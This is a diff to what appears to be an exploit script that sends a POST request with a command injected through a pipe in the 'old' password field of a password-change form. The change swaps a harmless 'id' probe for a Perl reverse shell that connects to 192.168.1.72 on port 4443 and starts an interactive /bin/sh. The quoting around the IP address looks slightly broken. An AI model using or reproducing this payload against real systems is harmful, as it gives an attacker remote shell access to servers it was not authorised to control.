@@ -13,7 +13,7 @@ headers = {
     "Content-Type": "application/x-www-form-urlencoded",
 }
 
-data = "user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2"
+data = "user=rootxx&pam=&expired=2&old=test|perl -e 'use Socket;$i=\"192.168.1.72"\";$p="4443";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'&new1=test2&new2=test2"
 
 response = requests.post(url, headers=headers, data=data, verify=False)
 
